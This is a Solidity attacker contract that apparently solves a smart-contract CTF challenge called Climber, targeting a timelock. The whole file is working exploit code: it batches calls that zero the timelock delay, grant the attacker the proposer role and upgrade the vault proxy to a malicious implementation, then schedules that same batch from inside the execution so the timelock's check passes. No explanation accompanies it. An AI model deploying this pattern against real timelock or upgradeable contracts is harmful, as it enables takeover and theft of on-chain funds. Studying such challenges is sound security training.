// SPDX-License-Identifier: UNDEFINED
pragma solidity ^0.8.0;

interface IClimberTimeLock {
    function updateDelay(uint64 newDelay) external;

    function grantRole(bytes32 role, address account) external;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract AttackerContract {
    address victimAddress;
    address vaultAddress;
    address maliciousContract;
    address owner;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    bool alreadyScheduled = false;

    constructor(
        address _vaulTimeLock,
        address _vault,
        address _maliciousContract
    ) {
        victimAddress = _vaulTimeLock;
        vaultAddress = _vault;
        maliciousContract = _maliciousContract;
        owner = msg.sender;
    }

    function attack() public {
        address[] memory targets = new address[](4);
        targets[0] = victimAddress;
        targets[1] = victimAddress;
        targets[2] = vaultAddress;
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory data = new bytes[](4);
        bytes memory updateDelayData = abi.encodeWithSelector(0x24adbc5b, 0);
        bytes memory grantRoleData = abi.encodeWithSelector(
            0x2f2ff15d,
            PROPOSER_ROLE,
            address(this)
        );
        bytes memory upgradeData = abi.encodeWithSelector(
            0x3659cfe6,
            maliciousContract
        );
        bytes memory prepareAttack = abi.encodeWithSelector(0x2629e70f, "");

        data[0] = updateDelayData;
        data[1] = grantRoleData;
        data[2] = upgradeData;
        data[3] = prepareAttack;

        IClimberTimeLock(victimAddress).execute(targets, values, data, 0x00);
    }

    function prepare_attack() public {
        if (!alreadyScheduled) {
            address[] memory targets = new address[](4);
            targets[0] = victimAddress;
            targets[1] = victimAddress;
            targets[2] = vaultAddress;
            targets[3] = address(this);

            uint256[] memory values = new uint256[](4);
            values[0] = 0;
            values[1] = 0;
            values[2] = 0;
            values[3] = 0;

            bytes[] memory data = new bytes[](4);
            bytes memory updateDelayData = abi.encodeWithSelector(
                0x24adbc5b,
                0
            );
            bytes memory grantRoleData = abi.encodeWithSelector(
                0x2f2ff15d,
                PROPOSER_ROLE,
                address(this)
            );
            bytes memory upgradeData = abi.encodeWithSelector(
                0x3659cfe6,
                maliciousContract
            );
            bytes memory prepareAttack = abi.encodeWithSelector(0x2629e70f, "");

            data[0] = updateDelayData;
            data[1] = grantRoleData;
            data[2] = upgradeData;
            data[3] = prepareAttack;

            IClimberTimeLock(victimAddress).schedule(
                targets,
                values,
                data,
                0x00
            );
        } else {
            return;
        }
    }
}
